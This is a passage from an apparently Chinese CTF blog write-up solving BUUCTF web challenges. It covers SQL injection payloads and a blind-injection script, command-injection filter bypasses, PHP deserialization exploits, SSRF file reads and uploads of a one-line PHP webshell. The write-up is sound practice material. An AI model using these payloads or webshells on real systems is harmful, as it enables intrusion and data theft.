class="code"><pre><code class="hljs gauss">&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-built_in">select</span> <span class="hljs-built_in">group_concat</span>(password) from l0ve1ysq1)<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="/2021/05/31/buuctf-web-1/image-20201109122141591.png" alt="image-20201109122141591"></p><h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>tornado模板注入，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109142438560.png" alt="image-20201109142438560"></p><p>根据提示，需要文件名和cookie_secret</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109142500146.png" alt="image-20201109142500146"></p><p>render渲染，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109142516300.png" alt="image-20201109142516300"></p><p>找到了文件名，然后就需要hash值了，</p><p>猜测存在模板注入，找到输入点。</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109142636807.png" alt="image-20201109142636807"></p><p>这里有用户输入，简单试试。</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109142700008.png" alt="image-20201109142700008"></p><p>查阅资料，找到 handler.settings 属性，试试看。</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109142753280.png" alt="image-20201109142753280"></p><p>然后进行加密，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109142937036.png" alt="image-20201109142937036"></p><h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p><img src="/2021/05/31/buuctf-web-1/image-20201109193848992.png" alt="image-20201109193848992"></p><p>ping命令，我们可以执行linux命令，这是一个rce</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109193917208.png" alt="image-20201109193917208"></p><p>空格被过滤了，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109193943923.png" alt="image-20201109193943923"></p><p>绕过空格的方法：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span> flag.txt<br><span class="hljs-built_in">cat</span><span class="hljs-variable">$</span>&#123;IFS&#125;flag.txt<br><span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9flag</span>.txt<br><span class="hljs-built_in">cat</span>&lt;flag.txt<br><span class="hljs-built_in">cat</span>&lt;&gt;flag.txt<br></code></pre></td></tr></table></figure><p>一些字符也被过滤了，只能用这种绕过：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109194054925.png" alt="image-20201109194054925"></p><p>估计flag被过滤了，我们读取index试试。</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109194127576.png" alt="image-20201109194127576"></p><p>发现过滤了好多，flag贪婪匹配了，这可咋办。。。</p><p>可以使用</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">?ip=127.0.0.1;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span>`<span class="hljs-keyword">ls</span>`<br></code></pre></td></tr></table></figure><p>或者sh，base64加密的方式：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span>$IFS$<span class="hljs-number">1</span>Y<span class="hljs-number">2</span>F<span class="hljs-number">0</span>IGZsYWcucGhw|base<span class="hljs-number">64</span>$IFS$<span class="hljs-number">1</span>-d|sh<br></code></pre></td></tr></table></figure><p><img src="/2021/05/31/buuctf-web-1/image-20201109194602514.png" alt="image-20201109194602514"></p><h1 id="Easy-Calc1"><a href="#Easy-Calc1" class="headerlink" title="Easy Calc1"></a>Easy Calc1</h1><p>源码泄露，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201110220526310.png" alt="image-20201110220526310"></p><p>然后发现字符被过滤了，使用php解析字符串的特性绕过，问号后边加空格。</p><p><img src="/2021/05/31/buuctf-web-1/image-20201110220712407.png" alt="image-20201110220712407"></p><p>读取目录，但是单引号被过滤了，使用如下payload：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201110220951863.png" alt="image-20201110220951863"></p><p>读取f1agg文件，</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">? num=print_r(file_get_contents(<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">49</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>)))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/05/31/buuctf-web-1/image-20201110221327620.png" alt="image-20201110221327620"></p><h1 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h1><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">123</span>|cat ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><p><img src="/2021/05/31/buuctf-web-1/image-20201111173214101.png" alt="image-20201111173214101"></p><h1 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h1><p><img src="/2021/05/31/buuctf-web-1/image-20201112152241674.png" alt="image-20201112152241674"></p><p>连接一句话马，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201112152304644.png" alt="image-20201112152304644"></p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>通过尝试，找到了<code>www.zip</code>备份目录，审计源码。</p><p>反序列化学习：<a href="https://www.jianshu.com/p/1d2c65601d2a">https://www.jianshu.com/p/1d2c65601d2a</a></p><p>输出flag的是class.php：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201113214722442.png" alt="image-20201113214722442"></p><p><code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p><p>绕过wakeup方法：</p><p><strong>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</strong></p><p>所以可以构造exp：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201118212526526.png" alt="image-20201118212526526"></p><p>将属性值2改为大于2的就可以了。因为有不可打印字符，所以我们对\0进行url编码。</p><p><img src="/2021/05/31/buuctf-web-1/image-20201118213222658.png" alt="image-20201118213222658"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">index</span>.php?select=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure><h1 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h1><p>访问secret.php：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201118214105813.png" alt="image-20201118214105813"></p><p><img src="/2021/05/31/buuctf-web-1/image-20201118214112544.png" alt="image-20201118214112544"></p><p>我们设置referer试试，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201118214151473.png" alt="image-20201118214151473"></p><p>再设置user-agent：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201118214306684.png" alt="image-20201118214306684"></p><p>本地只读，伪造ip：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201118214420371.png" alt="image-20201118214420371"></p><p>拿到flag</p><p>http请求包：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /Secret.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: node<span class="hljs-number">3</span>.buuoj.cn:<span class="hljs-number">26085</span><br><span class="hljs-attribute">Proxy</span>-Connection: keep-alive<br><span class="hljs-attribute">Referer</span>: https://www.Sycsecret.com<br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Syclover<br><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: UM_distinctid=<span class="hljs-number">175</span>b<span class="hljs-number">7</span>bc<span class="hljs-number">59</span>d<span class="hljs-number">4266</span>-<span class="hljs-number">032275</span>eb<span class="hljs-number">541</span>e<span class="hljs-number">94</span>-<span class="hljs-number">4353760</span>-<span class="hljs-number">144000</span>-<span class="hljs-number">175</span>b<span class="hljs-number">7</span>bc<span class="hljs-number">59</span>d<span class="hljs-number">5358</span><br></code></pre></td></tr></table></figure><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>解法很多，因为从头到尾都是照着wp做的，贴一篇wp吧。</p><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">https://blog.csdn.net/weixin_44677409/article/details/100733581</a></p><h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p>上传文件，抓包，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201130163901279.png" alt="image-20201130163901279"></p><p>返回</p><p><img src="/2021/05/31/buuctf-web-1/image-20201130163923032.png" alt="image-20201130163923032"></p><p>更改文件类型头：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201130164011530.png" alt="image-20201130164011530"></p><p>返回</p><p><img src="/2021/05/31/buuctf-web-1/image-20201130164029780.png" alt="image-20201130164029780"></p><p>更改后缀名称，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201130164258904.png" alt="image-20201130164258904"></p><p>返回</p><p><img src="/2021/05/31/buuctf-web-1/image-20201130164320280.png" alt="image-20201130164320280"></p><p>过滤了<code>&lt;?</code>。</p><p>更改脚本为：</p><script language="php">eval($_POST['a']);</script><p><img src="/2021/05/31/buuctf-web-1/image-20201130164606403.png" alt="image-20201130164606403"></p><p><img src="/2021/05/31/buuctf-web-1/image-20201130164623359.png" alt="image-20201130164623359"></p><p>应该是检查了文件内容，添加文件头试试。</p><p><img src="/2021/05/31/buuctf-web-1/image-20201130164818010.png" alt="image-20201130164818010"></p><p>上传成功，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201130164841827.png" alt="image-20201130164841827"></p><p>连接服务端。上传的文件在upload文件夹内。</p><p>得到flag：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201130165424764.png" alt="image-20201130165424764"></p><h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>前端校验，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201202193259648.png" alt="image-20201202193259648"></p><p>使用console重写函数。</p><p><img src="/2021/05/31/buuctf-web-1/image-20201202193717741.png" alt="image-20201202193717741"></p><p>上传后缀为.phtml的一句话马文件。</p><p><img src="/2021/05/31/buuctf-web-1/image-20201202193550210.png" alt="image-20201202193550210"></p><p><img src="/2021/05/31/buuctf-web-1/image-20201202193649179.png" alt="image-20201202193649179"></p><p>蚁剑连接，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201202194501924.png" alt="image-20201202194501924"></p><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>上传.php文件，检查后缀了，上传.php.jpg,过了后缀检测，但是发现检测了文件内容和文件头，最后上传如下文件：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201202195431071.png" alt="image-20201202195431071"></p><p>但是马不会执行，这里还有一个知识点：</p><p>.user.ini文件</p><p><a href="https://www.cnblogs.com/wangtanzhi/p/11862682.html">https://www.cnblogs.com/wangtanzhi/p/11862682.html</a></p><p>所以再传一个文件：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201202202953314.png" alt="image-20201202202953314"></p><p>连接蚁剑，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201202202934464.png" alt="image-20201202202934464"></p><h1 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h1><p>在页面代码中找到泄露代码，密码是404，但是不能是数字，php弱类型，传值404+字母即可。</p><p><img src="/2021/05/31/buuctf-web-1/image-20201211165613989.png" alt="image-20201211165613989"></p><p>但是money不能输入太长的长度。</p><p>使用科学计数法，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201211165910704.png" alt="image-20201211165910704"></p><h1 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h1><p>抓包发现hint</p><p><img src="/2021/05/31/buuctf-web-1/image-20201211170243271.png" alt="image-20201211170243271"></p><p><img src="/2021/05/31/buuctf-web-1/image-20201211171126357.png" alt="image-20201211171126357"></p><p>构造永真语句，</p><p>ffifdyop加密后为276f722736c95d99e921722cf9ed621c，276f722736变为字符串为<code>‘or’6</code>。</p><p>所以就绕过了password的判断。</p><p>进入下一个页面：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201211171524480.png" alt="image-20201211171524480"></p><p>弱类型比较，</p><p><code>a=QNKCDZO&amp;b=240610708</code></p><p><img src="/2021/05/31/buuctf-web-1/image-20201211171659546.png" alt="image-20201211171659546"></p><p>数组绕过，</p><p>md5()计算的是字符串的哈希值，对于数组则返回false，传两个数组，得到两个FALSE相等得以绕过。</p><p><img src="/2021/05/31/buuctf-web-1/image-20201211172134343.png" alt="image-20201211172134343"></p><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p><img src="/2021/05/31/buuctf-web-1/image-20201230144638614.png" alt="image-20201230144638614"></p><p>需要读取内容为welcome to the zjctf，使用data协议写入内容，</p><p><code>text=data://text/plain,welcome to the zjctf</code></p><p>然后读取useless.php,读取php文件需要使用filter协议</p><p><code>php://filter/read=convert.base64-encode/resource=useless.php</code></p><p>得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最后是反序列化漏洞，将Flag类序列化，</p><p><code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p>最终payload</p><p><code>/?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p>要注意第二个参数file是useless.php，这样才是包含一个php文件，而filter协议读取的是源码文本。</p><p>得到flag：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201230151427427.png" alt="image-20201230151427427"></p><h1 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h1><p>sql注入，先模糊测试，因为第一个字符会忽略，所以从第二个字符测试，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201231183535996.png" alt="image-20201231183535996"></p><p>函数几乎没有被过滤，使用盲注，</p><p>二分法写的有点问题，直接枚举吧。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> <span class="hljs-built_in">time</span><br>ss = string.printable<br>url = <span class="hljs-string">&#x27;http://1b30c1b1-9655-4d76-9e6e-332ae83bf048.node3.buuoj.cn/index.php&#x27;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> x <span class="hljs-built_in">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    s = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> ss:<br>        payload = <span class="hljs-string">&quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot;</span> % (x, ord(i))<br>        <span class="hljs-keyword">data</span> = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>:payload<br>        &#125;<br>        <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.05</span>)<br>        response = requests.post(url, <span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span> <span class="hljs-built_in">in</span> response.<span class="hljs-keyword">text</span>:<br>            s = i<br>            break<br>    result += s<br>    print(result)<br></code></pre></td></tr></table></figure><p>flag{3f3b99be-359b-4a5f-9fc6-0eb6f2c00474}</p><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>经过测试发现有过滤，burp进行fuzz。</p><p>等号，空格，union, *号等被过滤。</p><p>使用报错注入，空格用()代替。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;or(extractvalue(&quot;anything&quot;,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(database()))))#  </span><br><span class="hljs-string">------  geek</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span>(extractvalue(&quot;anything&quot;,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())))))#<br><span class="hljs-comment">------  H4rDsq1</span><br><span class="hljs-string">&#x27;or(extractvalue(&quot;anything&quot;,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="hljs-string">&#x27;)))))#</span><br><span class="hljs-string">-----   id,username,password</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span>(extractvalue(&quot;anything&quot;,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span>(group_concat(username))<span class="hljs-keyword">from</span>(H4rDsq1)))))#<br><span class="hljs-comment">-----   flag</span><br><span class="hljs-string">&#x27;or(extractvalue(&quot;anything&quot;,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select(group_concat(password))from(H4rDsq1)))))#</span><br><span class="hljs-string">-----   flag&#123;181d97e5-323e-4358-866a-0c</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span>(extractvalue(&quot;anything&quot;,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span>(group_concat(right(<span class="hljs-keyword">password</span>,<span class="hljs-number">20</span>)))<span class="hljs-keyword">from</span>(H4rDsq1)))))#<br><span class="hljs-comment">-----   8-866a-0c2c20dcb643&#125;</span><br></code></pre></td></tr></table></figure><p>flag{181d97e5-323e-4358-866a-0c2c20dcb643}</p><h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>robots.txt源码泄漏</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> get(<span class="hljs-variable">$url</span>)<br>  &#123;<br>  <span class="hljs-regexp">//</span>创建curl资源<br>      <span class="hljs-variable">$ch</span> = curl_init();<br><br>      <span class="hljs-regexp">//</span>设置URL和相应的选项<br>      curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>      curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>      <span class="hljs-regexp">//</span>抓取URL并传递给浏览器<br>      <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>      <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>          return <span class="hljs-number">404</span>;<br>      &#125;<br>      <span class="hljs-regexp">//</span>关闭curl资源。释放系统资源<br>      curl_close(<span class="hljs-variable">$ch</span>);<br><br>      return <span class="hljs-variable">$output</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p>SSRF，通过服务器伪造恶意URL读取flag.php。</p><p>登陆，在view.php发现sql注入。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-number">1</span>%20or%20extractvalue(<span class="hljs-string">&quot;123&quot;</span>,concat(%27~%27,(database())))<span class="hljs-comment">#</span><br>--- fakebook<br><span class="hljs-number">1</span>%20or%20extractvalue(<span class="hljs-string">&quot;123&quot;</span>,concat(%27~%27,(<span class="hljs-keyword">select</span>%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())))<span class="hljs-comment">#</span><br>--- users<br><span class="hljs-number">1</span>%20or%20extractvalue(<span class="hljs-string">&quot;123&quot;</span>,concat(%27~%27,(<span class="hljs-keyword">select</span>%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=<span class="hljs-string">&quot;users&quot;</span>)))<span class="hljs-comment">#</span><br>--- <span class="hljs-keyword">no</span>,username,passwd,data,USER,CU<br><span class="hljs-number">1</span>%20or%20extractvalue(<span class="hljs-string">&quot;123&quot;</span>,concat(%27~%27,(<span class="hljs-keyword">select</span>%20group_concat(data)%20from%20users)))<span class="hljs-comment">#</span><br><span class="hljs-number">1</span>%20or%20extractvalue(<span class="hljs-string">&quot;123&quot;</span>,concat(%27~%27,<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>%20data%20from%20users),<span class="hljs-number">20</span>,<span class="hljs-number">30</span>)))<span class="hljs-comment">#</span><br>--- O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">12</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">67</span>:<span class="hljs-string">&quot;http://67c51528-60aa-442f-8197-40ccdd9a8971.node3.buuoj.cn/join.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>更改data数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> UserInfo();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs q">O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;<br><br>联合查询序列化后的字符串，<span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span>被ban，使用<span class="hljs-built_in">union</span>/**/<span class="hljs-keyword">select</span>绕过<br><span class="hljs-number">0</span>%<span class="hljs-number">20</span><span class="hljs-built_in">union</span>/**/<span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,%<span class="hljs-number">202</span>,<span class="hljs-number">3</span>,&#x27;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span 